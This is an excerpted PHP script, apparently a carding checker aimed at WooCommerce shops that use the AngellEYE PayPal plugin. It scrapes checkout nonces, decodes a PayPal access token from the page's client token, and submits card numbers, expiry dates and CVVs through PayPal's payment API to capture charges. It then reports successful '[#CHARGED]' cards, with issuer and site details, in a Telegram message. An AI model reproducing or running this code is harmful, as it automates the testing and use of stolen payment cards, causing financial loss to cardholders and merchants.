...
if (preg_match('/"three_d_secure_contingency":"(.*?)"/', $Checkout, $matches)) {
    $three_d_secure_contingency = $matches[1];
     "Three D Secure Contingency: " . $three_d_secure_contingency . "\n";
}
// Extract `data-client-token` using preg_match
if (preg_match('/"data-client-token":"(.*?)"/', $Checkout, $matches)) {
    $data_client_token = $matches[1];
     "Data Client Token: " . $data_client_token . "\n";

    // Base64 decode the token
    $decoded_token = base64_decode($data_client_token);
     "Decoded Token: " . $decoded_token . "\n";

    // JSON decode the base64 decoded string
    $json_decoded = json_decode($decoded_token, true);

    // Check if access token exists
    if (isset($json_decoded['paypal']['accessToken'])) {
        $access_token = $json_decoded['paypal']['accessToken'];
...
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://$hostname/wc-api/AngellEYE_PayPal_PPCP_Front_Action?angelleye_ppcp_action=create_order&utm_nooverride=1&from=checkout");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
...
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://cors.api.paypal.com/v2/checkout/orders/$orderID/confirm-payment-source");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
...
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
    'payment_source' => [
        'card' => [
            'number' => $cc,
            'expiry' => ''.$ano_with_20.'-'.$mes_with_zero.'',
            'security_code' => $cvv,
            'name' => $full_name,
            'attributes' => [
                'verification' => [
...
curl_close($ch);
$data = json_decode($Payment1, true);

// Extract the issue value
$issue = $data['details'][0]['issue'];

#-------------

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://$hostname/wc-api/AngellEYE_PayPal_PPCP_Front_Action?angelleye_ppcp_action=cc_capture&utm_nooverride=1&paypal_order_id=$orderID&woocommerce-process-checkout-nonce=$nonce&is_pay_page=no");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'accept-language: en-US,en;q=0.9',
...
$Checkout2 = curl_exec($ch);
curl_close($ch);
htmlentities($Checkout2);

$pattern = '/"update_order_review_nonce":"(.*?)"/';
preg_match($pattern, $Checkout2, $matches);
$update_order_review_nonce = $matches[1] ?? null;

# ---------------- [ UPDATE REVIEW ] --------- #

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://$hostname/?paypal_order_id=$orderID&wc-ajax=update_order_review");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
...
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    ...
    'post_data' => http_build_query([
        ...
        'billing_address_1' => $street,
        'billing_address_2' => '',
        'billing_wooccm11' => 'SNC',
        'billing_city' => $city,
        'billing_state' => $state,
        'billing_postcode' => $zip,
        'billing_phone' => $phone,
        'billing_wooccm10' => $phone,
        'billing_email' => $email,
        'account_username' => $fname,
        'account_password' => '11qq22ww33ee13',
        ...
        'terms-field' => '1',
        'woocommerce-process-checkout-nonce' => $nonce,
        '_wp_http_referer' => '/checkout/?paypal_order_id='.$orderID.'&utm_nooverride=1&wfacp_is_checkout_override=yes'
    ]),
]));

$Payment0 = curl_exec($ch);
curl_close($ch);
...
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    ...
    'terms-field' => '1',
    'woocommerce-process-checkout-nonce' => $nonce,
    '_wp_http_referer' => '/?paypal_order_id='.$orderID.'&wc-ajax=update_order_review'
]));
...
if (strpos($Payment, '"result":"success","redirect"') !== false && strpos($Payment, 'order-received') !== false) { 
    ...
    <span style="color: #15b823ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
        ...
        $telegramMessage = "[#CHARGED] - $lista ['angelleye_ppcp_cc']
        \n[$receiptUrl]
        \n[$price1]
        \n[$hostname1]\n";
